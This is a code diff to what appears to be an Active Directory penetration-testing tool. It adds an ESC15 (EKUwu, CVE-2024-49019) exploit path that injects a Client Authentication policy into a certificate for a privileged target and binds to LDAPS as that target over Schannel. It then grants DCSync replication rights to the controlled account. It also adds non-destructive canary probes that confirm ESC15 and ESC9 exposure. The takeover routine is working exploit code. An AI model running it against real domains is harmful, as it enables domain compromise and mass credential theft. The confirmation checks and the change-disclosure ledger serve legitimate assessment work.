@@ -3,12 +3,13 @@
 from __future__ import annotations
 
 from pathlib import Path
-from typing import Optional
+from typing import Any, Optional
 
 from adscan_internal import telemetry
-from adscan_core.rich_output import print_info, print_success
+from adscan_core.rich_output import print_info, print_success, print_warning
 from adscan_internal.services.adcs.cert_request import (
     CertRequestConfig,
+    _CR_DISP_UNDER_SUBMISSION,
     request_certificate_native,
 )
 from adscan_internal.services.adcs.cert_auth import (
@@ -18,8 +19,42 @@ from adscan_internal.services.adcs.cert_auth import (
 from adscan_internal.services.adcs.esc_types import EscConfig, EscResult
 from adscan_core.rich_output import print_exception
 
-# OID that makes a cert usable as an enrollment agent (ESC15)
+# OID that makes a cert usable as an enrollment agent (ESC15 method B)
 _ENROLLMENT_AGENT_OID = "1.3.6.1.4.1.311.20.2.1"
+
+# OID that makes a cert usable for Schannel client authentication (ESC15 method
+# A). On a schema-v1 EnrolleeSuppliesSubject template the CA honours this
+# application policy supplied in the CSR, overriding the template's EKU for
+# Schannel (but NOT for PKINIT — "Inconsistent Key Purpose"), so the issued cert
+# authenticates over an LDAPS Schannel bind as the SAN UPN identity.
+_CLIENT_AUTHENTICATION_OID = "1.3.6.1.5.5.7.3.2"
+
+# Canary application-policy OIDs for the non-destructive ESC15 confirmation.
+# Primary = Certificate Request Agent (enrollment agent): a legitimate schema-v1
+# EnrolleeSuppliesSubject template certificate never carries it, so its presence
+# in an issued cert is an unambiguous signal that the CA copied an injected
+# application policy. The rest are fallbacks, used only when the template's own
+# EKU already declares the primary (which would make the signal ambiguous).
+_CONFIRM_CANARY_APPLICATION_POLICY_OIDS = (
+    "1.3.6.1.4.1.311.20.2.1",  # Certificate Request Agent (enrollment agent)
+    "1.3.6.1.4.1.311.10.3.4",  # Encrypting File System
+    "1.3.6.1.4.1.311.10.3.12",  # Document Signing
+)
+
+
+def _select_confirm_canary_oid(template_eku_oids: Optional[list[str]]) -> str:
+    """Pick a canary application-policy OID absent from the template's own EKU.
+
+    The canary must be an OID the template cannot legitimately carry, so that
+    finding it in the issued cert proves injection rather than a pre-existing
+    EKU. Falls back through the candidate list if the primary is already in the
+    template EKU, and returns the primary if (absurdly) all candidates are.
+    """
+    declared = {o.strip() for o in (template_eku_oids or []) if o and o.strip()}
+    for oid in _CONFIRM_CANARY_APPLICATION_POLICY_OIDS:
+        if oid not in declared:
+            return oid
+    return _CONFIRM_CANARY_APPLICATION_POLICY_OIDS[0]
 
 
 def _output_dir(config: EscConfig, sub: str) -> Path:
@@ -88,6 +123,23 @@ async def _pkinit(
     )
     auth = await authenticate_with_cert_native(auth_cfg, output_dir)
     if not auth.success:
+        if getattr(auth, "certificate_binding_refused", False):
+            # The DC enforces strong certificate binding (KB5014754) and refused
+            # the certificate mapping. An honest HARDENED positive control, not a
+            # failed attempt — mirror the ESC15 confirm vocabulary (evidence
+            # verdict "hardened"). Every enrollment ESC that converges on this
+            # shared PKINIT seam inherits the honest surfacing.
+            return EscResult(
+                success=False,
+                esc=config.esc,
+                error=auth.error or "PKINIT refused by strong certificate binding",
+                evidence={
+                    "verdict": "hardened",
+                    "certificate_binding_refused": True,
+                    "reason": auth.error
+                    or "the domain controller enforces strong certificate binding",
+                },
+            )
         return EscResult(
             success=False, esc=config.esc, error=auth.error or "PKINIT failed"
         )
@@ -369,6 +421,581 @@ async def run_esc15(config: EscConfig) -> EscResult:
             error=req2.error or "phase 2 on-behalf-of request failed",
         )
     return await _pkinit(config, req2.pfx_path, req2.pfx_password or "", out)
+
+
+async def run_esc15_schannel(config: EscConfig) -> EscResult:
+    """ESC15 method A (Schannel / PassTheCert): inject Client Authentication.
+
+    The one-certificate, one-template ESC15 route with the fewest dependencies
+    (no enrollment agent, no second template). On the SAME schema-v1
+    EnrolleeSuppliesSubject template it enrolls a certificate that injects the
+    Client Authentication application policy OID and sets the SAN UPN to the
+    privileged target, then authenticates that certificate over an **LDAPS
+    Schannel bind (SASL EXTERNAL)** as the target (not PKINIT: the EKU stays
+    Server Authentication, so PKINIT fails "Inconsistent Key Purpose"; the
+    application-policy override applies only to Schannel). Bound as the target it
+    performs the LDAP-level takeover: grant DCSync to the controlled enrolling
+    principal, the canonical PassTheCert domain-takeover.
+
+    LDAPS-only: when LDAPS is unavailable the Schannel bind cannot run, so this
+    returns an honest data-gap failure and the caller falls back to method B.
+    """
+    out = _output_dir(config, "esc15_schannel")
+
+    # Phase 1: enroll a client-authentication certificate for the target (SAN UPN).
+    try:
+        req = await request_certificate_native(
+            _request_cfg(
+                config,
+                upn=config.target_upn,
+                application_policies=[_CLIENT_AUTHENTICATION_OID],
+            ),
+            out,
+        )
+    except Exception as exc:
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+        return EscResult(success=False, esc=15, error=str(exc))
+    if not req.success or not req.pfx_path:
+        return EscResult(
+            success=False,
+            esc=15,
+            error=f"phase 1 cert request failed: {req.error}"
+            if req.error
+            else "phase 1 cert request failed",
+        )
+
+    print_info(
+        "ESC15 method A: client-authentication certificate issued; binding to "
+        "LDAPS over Schannel as the target identity (no PKINIT)."
+    )
+
+    # Phase 2: Schannel LDAPS bind as the target via the reusable native primitive.
+    from adscan_internal.services.ldap_transport_service import (
+        SchannelBindError,
+        SchannelLdapsUnavailable,
+        async_schannel_cert_bind,
+    )
+
+    posture_snapshot = None
+    shell = config.shell
+    if shell is not None:
+        try:
+            from adscan_internal.services.domain_posture import get_posture
+
+            posture_snapshot = get_posture(
+                getattr(shell, "domains_data", {}), domain=config.domain
+            )
+        except Exception:  # noqa: BLE001 — advisory only
+            posture_snapshot = None
+
+    try:
+        client = await async_schannel_cert_bind(
+            dc_ip=config.dc_ip,
+            pfx_path=str(req.pfx_path),
+            pfx_password=req.pfx_password or "",
+            dc_fqdn=config.dc_fqdn,
+            domain=config.domain,
+            posture_snapshot=posture_snapshot,
+        )
+    except SchannelLdapsUnavailable as exc:
+        # Method A is not possible here (LDAPS unavailable) — honest data gap so
+        # the executor falls back to method B. NEVER a claim about the cert.
+        return EscResult(
+            success=False,
+            esc=15,
+            error=f"schannel_ldaps_unavailable: {exc}",
+            evidence={"method": "schannel", "schannel_available": False},
+        )
+    except SchannelBindError as exc:
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+        return EscResult(
+            success=False,
+            esc=15,
+            error=f"schannel bind failed: {exc}",
+            evidence={"method": "schannel", "schannel_bind_failed": True},
+        )
+
+    # Phase 3: LDAP-level takeover — grant DCSync to the controlled principal.
+    try:
+        takeover = await _esc15_schannel_grant_dcsync(config, client)
+    finally:
+        try:
+            await client.disconnect()
+        except Exception:  # noqa: BLE001 — best-effort teardown
+            pass
+    return takeover
+
+
+async def _esc15_schannel_grant_dcsync(config: EscConfig, client: Any) -> EscResult:
+    """Grant DCSync to the controlled enrolling principal over the Schannel client.
+
+    Bound as the privileged target, add the GetChanges/GetChangesAll ACEs for the
+    owned enrolling principal to the domain object's DACL (vendor
+    ``MSLDAPClient.add_priv_dcsync``). The ACE is a durable AD change, so it is
+    disclosed in the environment-change ledger with a ``manual_required``
+    rollback (removing a replication ACE is done by hand / via the dacledit
+    remove path, never silently left behind).
+    """
+    owned_user = (config.username or "").split("\\", 1)[-1].split("@", 1)[0].strip()
+    if not owned_user:
+        return EscResult(
+            success=False,
+            esc=15,
+            error="ESC15 method A: no controlled principal to grant DCSync to",
+            evidence={"method": "schannel"},
+        )
+
+    try:
+        await client.get_ad_info()
+    except Exception:  # noqa: BLE001 — add_priv_dcsync falls back to its own lookup
+        pass
+
+    owned_dn = await _resolve_dn_over_client(client, owned_user)
+    if not owned_dn:
+        return EscResult(
+            success=False,
+            esc=15,
+            error=(
+                "ESC15 method A: Schannel bind succeeded but the controlled "
+                f"principal {owned_user!r} could not be resolved for the DCSync grant"
+            ),
+            evidence={"method": "schannel", "schannel_bind": "success"},
+        )
+
+    ok, err = await client.add_priv_dcsync(owned_dn)
+    if not ok:
+        return EscResult(
+            success=False,
+            esc=15,
+            error=f"ESC15 method A: DCSync grant failed: {err}",
+            evidence={
+                "method": "schannel",
+                "schannel_bind": "success",
+                "takeover": "dcsync_grant_failed",
+            },
+        )
+
+    # Disclose the replication-rights grant (durable ACL change on the DOMAIN
+    # object's DACL) in the environment-change ledger. Removing a replication ACE
+    # is not attempted automatically over the Schannel session, so it is recorded
+    # as the legal-critical manual_required terminal state with the native
+    # removal command the client runs.
+    domain_dn = str(getattr(client, "_tree", "") or "").strip()
+    try:
+        from adscan_internal.services.adcs.esc_cleanup import register_ldap_change
+        from adscan_internal.services.cleanup_taxonomy import (
+            MANUAL_REASON_NOT_ATTEMPTED,
+        )
+
+        change_id = register_ldap_change(
+            config.shell,
+            kind="dacl_grant_dcsync",
+            domain=config.domain,
+            target=domain_dn or config.domain,
+            detail={
+                "right": "DCSync (DS-Replication-Get-Changes[-All])",
+                "trustee": owned_user,
+                "object": "domain object DACL",
+                "technique": "ADCSESC15 method A (Schannel / PassTheCert)",
+            },
+            method="ADCSESC15 Schannel LDAPS cert bind",
+        )
+        ledger = getattr(config.shell, "environment_change_ledger", None)
+        if ledger is not None and change_id:
+            netbios = config.domain.split(".", 1)[0].upper()
+            ledger.mark_manual_required(
+                change_id,
+                reason=MANUAL_REASON_NOT_ATTEMPTED,
+                remediation_command=(
+                    f'dsacls "{domain_dn or "<domain DN>"}" /R "{netbios}\\{owned_user}"'
+                ),
+                remediation_object_dn=domain_dn or config.domain,
+                manual_cleanup_instructions=(
+                    "Remove the replication (DS-Replication-Get-Changes and "
+                    "DS-Replication-Get-Changes-All) access control entries granted "
+                    f"to {owned_user} on the domain object, then audit the domain "
+                    "DACL for any other unexpected replication grants."
+                ),
+            )
+    except Exception as exc:  # noqa: BLE001 — disclosure is best-effort
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+
+    print_success(
+        f"ESC15 method A: DCSync granted to {owned_user} via Schannel "
+        "(PassTheCert); the controlled principal can now replicate the domain."
+    )
+    return EscResult(
+        success=True,
+        esc=15,
+        evidence={
+            "method": "schannel",
+            "schannel_bind": "success",
+            "takeover": "dcsync_grant",
+            "trustee": owned_user,
+        },
+    )
+
+
+async def _resolve_dn_over_client(client: Any, sam_account_name: str) -> Optional[str]:
+    """Resolve a principal's distinguishedName via a bound badldap client."""
+    try:
+        base_dn = getattr(client, "_tree", None) or ""
+        query = f"(sAMAccountName={sam_account_name})"
+        async for obj, err in client.pagedsearch(
+            query, attributes=["distinguishedName"], tree=base_dn or None
+        ):
+            if err is not None:
+                break
+            if not isinstance(obj, dict):
+                continue
+            attrs = obj.get("attributes") if isinstance(obj.get("attributes"), dict) else obj
+            dn = attrs.get("distinguishedName") or obj.get("objectName")
+            if isinstance(dn, (list, tuple)):
+                dn = dn[0] if dn else None
+            if dn:
+                return str(dn)
+    except Exception as exc:  # noqa: BLE001
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+    return None
+
+
+async def confirm_esc15_vulnerable(
+    config: EscConfig,
+    *,
+    template_eku_oids: Optional[list[str]] = None,
+) -> EscResult:
+    """Minimal, NON-DESTRUCTIVE ESC15 / EKUwu (CVE-2024-49019) confirmation.
+
+    Proves whether the CA honours application-policy injection WITHOUT performing
+    the domain takeover. It enrolls ONE certificate for the ENROLLING USER
+    THEMSELVES (subject = self: no on-behalf-of, no SAN target, no privileged
+    identity) with a canary application policy injected into the CSR, then
+    inspects the ISSUED certificate for that canary:
+
+    * canary present: the CA copied the injected application policy into the
+      issued cert. CONFIRMED vulnerable (unpatched), HIGH.
+    * canary absent (cert issued but the policy was stripped): the CA denies
+      application-policy injection. PATCHED / hardened (an observed positive).
+    * request denied (disposition is not "issued"): attempted, with an honest
+      reason. Never a defensive-control claim.
+    * request pends (manager approval): indeterminate (data gap).
+
+    HARD SAFETY BOUNDARY: this path NEVER mints or uses a privileged identity.
+    It never calls PKINIT, cert authentication, or on-behalf-of enrollment (none
+    of those are imported or invoked here). The confirmation proves CA
+    exploitability; it stops at the issued certificate. The issued cert is still
+    a durable credential left in the client's PKI, so disclosure + revocation
+    are inherited from ``request_certificate_native`` (the ``ledger_*`` fields on
+    the request config); this runner adds no second disclosure.
+
+    Args:
+        config: ESC enrollment parameters (CA, template, enrolling credential).
+        template_eku_oids: The vulnerable template's declared EKU OIDs, used only
+            to pick a canary the template cannot already carry. Optional.
+
+    Returns:
+        An :class:`EscResult` whose ``evidence['verdict']`` is one of
+        ``confirmed_vulnerable`` / ``hardened`` / ``attempted`` / ``indeterminate``.
+        ``success`` is True ONLY for ``confirmed_vulnerable``.
+    """
+    out = _output_dir(config, "esc15_confirm")
+    canary_oid = _select_confirm_canary_oid(template_eku_oids)
+
+    # Subject = self. ``_request_cfg`` sets CN=<user>@<auth_domain>, and we pass
+    # NEITHER ``upn`` (no SAN target) NOR ``on_behalf_of`` (no agent envelope),
+    # so the request carries only the enrolling user's own subject.
+    req_cfg = _request_cfg(config, application_policies=[canary_oid])
+
+    print_info(
+        "ESC15 confirmation: enrolling a self-subject certificate with a canary "
+        "application policy (non-destructive: no privileged identity is minted)."
+    )
+
+    try:
+        req = await request_certificate_native(req_cfg, out)
+    except Exception as exc:
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+        return EscResult(
+            success=False,
+            esc=15,
+            error=str(exc),
+            evidence={
+                "verdict": "attempted",
+                "confirm_only": True,
+                "canary_oid": canary_oid,
+                "reason": f"certificate request raised: {exc}",
+            },
+        )
+
+    base_evidence = {
+        "confirm_only": True,
+        "canary_oid": canary_oid,
+        "request_id": req.request_id,
+        "disposition": req.disposition,
+        "issued_eku_oids": list(req.issued_eku_oids),
+        "issued_application_policy_oids": list(req.issued_application_policy_oids),
+    }
+
+    if not req.success:
+        if req.disposition == _CR_DISP_UNDER_SUBMISSION:
+            print_warning(
+                "ESC15 confirmation indeterminate: the CA held the request for "
+                "manager approval, so EKUwu can be neither confirmed nor ruled out."
+            )
+            return EscResult(
+                success=False,
+                esc=15,
+                error=req.error or "request pending manager approval",
+                evidence={
+                    **base_evidence,
+                    "verdict": "indeterminate",
+                    "reason": "request pending manager approval (data gap)",
+                },
+            )
+        print_warning(
+            "ESC15 confirmation attempted: the CA did not issue the certificate."
+        )
+        return EscResult(
+            success=False,
+            esc=15,
+            error=req.error or "certificate not issued",
+            evidence={
+                **base_evidence,
+                "verdict": "attempted",
+                "reason": req.error or "certificate not issued",
+            },
+        )
+
+    # Issued: inspect the certificate for the canary application policy.
+    if canary_oid in (req.issued_application_policy_oids or []):
+        print_success(
+            "ESC15 CONFIRMED (unpatched): the CA copied the injected application "
+            "policy into the issued certificate (CVE-2024-49019 / EKUwu)."
+        )
+        return EscResult(
+            success=True,
+            esc=15,
+            pfx_path=str(req.pfx_path) if req.pfx_path else None,
+            evidence={
+                **base_evidence,
+                "verdict": "confirmed_vulnerable",
+                "severity": "HIGH",
+                "reason": (
+                    "injected application-policy OID survived into the issued "
+                    "certificate"
+                ),
+            },
+        )
+
+    print_success(
+        "ESC15 not confirmed (hardened): the CA issued the certificate but "
+        "stripped the injected application policy (CVE-2024-49019 patched)."
+    )
+    return EscResult(
+        success=False,
+        esc=15,
+        pfx_path=str(req.pfx_path) if req.pfx_path else None,
+        evidence={
+            **base_evidence,
+            "verdict": "hardened",
+            "reason": (
+                "injected application-policy OID was stripped from the issued "
+                "certificate"
+            ),
+        },
+    )
+
+
+async def confirm_esc9_vulnerable(config: EscConfig) -> EscResult:
+    """Minimal, NON-DESTRUCTIVE ESC9 / ESC10 behavioral canary (implicit-mapping probe).
+
+    Proves whether the DC still honours the WEAK implicit (UPN-from-subject)
+    certificate mapping a no-SID certificate relies on, WITHOUT the ESC9 takeover.
+    It enrolls ONE certificate for the ENROLLING USER THEMSELVES (subject = self:
+    no ``upn`` SAN target, no ``on_behalf_of`` agent envelope, no UPN swap, no
+    shadow credentials, no impersonation) from the ESC9 NO_SECURITY_EXTENSION
+    template, so the issued certificate carries NO SID security extension. It then
+    PKINITs as self:
+
+    * ``certificate_binding_refused`` (Kerberos error 66, KDC_ERR_CERTIFICATE_MISMATCH):
+      the DC enforces strong certificate binding (KB5014754 Full) and refused the
+      implicit mapping. HARDENED (an observed positive control).
+    * PKINIT success: the DC honoured the implicit mapping of a no-SID certificate,
+      so weak binding is confirmed present. CONFIRMED vulnerable, HIGH.
+    * anything else (request denied / pending, a non-66 PKINIT failure, a clock-skew
+      KDC_ERR_CLIENT_NOT_TRUSTED): indeterminate (data gap) — never a hardened or a
+      defensive-control claim.
+
+    HARD SAFETY BOUNDARY: strictly LESS invasive than the ESC9 executor
+    (``run_esc9``), which plants shadow credentials on a victim, swaps its UPN and
+    restores it. This canary mints and uses ONLY the enrolling principal's own
+    identity (a TGT it could already obtain with its password), so it gains no
+    privilege it did not already hold. The issued self certificate is the same
+    durable-credential residue as the ESC15 canary, disclosed + revocable via
+    ``request_certificate_native``'s ``ledger_*`` fields; this runner adds no second
+    disclosure.
+
+    Returns:
+        An :class:`EscResult` whose ``evidence['verdict']`` is one of
+        ``confirmed_vulnerable`` / ``hardened`` / ``indeterminate``. ``success`` is
+        True ONLY for ``confirmed_vulnerable``.
+    """
+    out = _output_dir(config, "esc9_confirm")
+
+    # Subject = self: NO upn (no SAN target), NO on_behalf_of (no agent envelope).
+    # The template carries CT_FLAG_NO_SECURITY_EXTENSION, so the issued certificate
+    # has no SID extension; with no SAN UPN the DC falls back to the implicit
+    # (UPN-from-subject) mapping — exactly the mapping SCBE Full refuses.
+    req_cfg = _request_cfg(config)
+
+    print_info(
+        "ESC9 confirmation: enrolling a self-subject certificate with no SID "
+        "security extension and PKINIT as self (non-destructive: no shadow "
+        "credentials, no UPN swap, no privileged identity is minted)."
+    )
+
+    try:
+        req = await request_certificate_native(req_cfg, out)
+    except Exception as exc:
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+        return EscResult(
+            success=False,
+            esc=config.esc,
+            error=str(exc),
+            evidence={
+                "verdict": "indeterminate",
+                "confirm_only": True,
+                "reason": f"certificate request raised: {exc}",
+            },
+        )
+
+    base_evidence = {
+        "confirm_only": True,
+        "request_id": req.request_id,
+        "disposition": req.disposition,
+    }
+
+    if not req.success:
+        if req.disposition == _CR_DISP_UNDER_SUBMISSION:
+            print_warning(
+                "ESC9 confirmation indeterminate: the CA held the request for "
+                "manager approval, so the certificate binding can be neither "
+                "confirmed nor ruled out."
+            )
+            return EscResult(
+                success=False,
+                esc=config.esc,
+                error=req.error or "request pending manager approval",
+                evidence={
+                    **base_evidence,
+                    "verdict": "indeterminate",
+                    "reason": "request pending manager approval (data gap)",
+                },
+            )
+        print_warning(
+            "ESC9 confirmation attempted: the CA did not issue the certificate."
+        )
+        return EscResult(
+            success=False,
+            esc=config.esc,
+            error=req.error or "certificate not issued",
+            evidence={
+                **base_evidence,
+                "verdict": "indeterminate",
+                "reason": req.error or "certificate not issued",
+            },
+        )
+
+    # Issued: PKINIT as self and read the DC's certificate-binding decision.
+    auth_cfg = CertAuthConfig(
+        domain=config.domain,
+        kdc_ip=config.dc_ip,
+        pfx_path=req.pfx_path,
+        pfx_password=req.pfx_password or "",
+        username=config.username.split("@")[0] if config.username else None,
+    )
+    try:
+        auth = await authenticate_with_cert_native(auth_cfg, out)
+    except Exception as exc:
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+        return EscResult(
+            success=False,
+            esc=config.esc,
+            error=str(exc),
+            evidence={
+                **base_evidence,
+                "verdict": "indeterminate",
+                "reason": f"PKINIT raised: {exc}",
+            },
+        )
+
+    if getattr(auth, "certificate_binding_refused", False):
+        # Code 66 — the DC enforces strong certificate binding and refused the
+        # implicit mapping. An honest HARDENED positive control, not a failure.
+        print_success(
+            "ESC9 not confirmed (hardened): the domain controller enforces strong "
+            "certificate binding and refused the no-SID certificate mapping "
+            "(KB5014754)."
+        )
+        return EscResult(
+            success=False,
+            esc=config.esc,
+            error=auth.error,
+            evidence={
+                **base_evidence,
+                "verdict": "hardened",
+                "certificate_binding_refused": True,
+                "reason": auth.error
+                or (
+                    "the domain controller enforces strong certificate binding "
+                    "(KB5014754): a certificate with no SID extension is refused"
+                ),
+            },
+        )
+
+    if auth.success:
+        print_success(
+            "ESC9 CONFIRMED (weak binding): a self-subject certificate carrying no "
+            "SID extension authenticated via the implicit mapping, so the domain "
+            "controller accepts weak certificate binding."
+        )
+        return EscResult(
+            success=True,
+            esc=config.esc,
+            evidence={
+                **base_evidence,
+                "verdict": "confirmed_vulnerable",
+                "severity": "HIGH",
+                "reason": (
+                    "a certificate with no SID extension authenticated via the "
+                    "implicit mapping, so the domain controller accepts weak "
+                    "certificate binding"
+                ),
+            },
+        )
+
+    print_warning(
+        "ESC9 confirmation indeterminate: PKINIT neither succeeded nor was refused "
+        "by strong certificate binding."
+    )
+    return EscResult(
+        success=False,
+        esc=config.esc,
+        error=auth.error or "PKINIT did not succeed",
+        evidence={
+            **base_evidence,
+            "verdict": "indeterminate",
+            "reason": auth.error
+            or "PKINIT neither succeeded nor was refused by strong binding",
+        },
+    )
 
 
 # ---------------------------------------------------------------------------
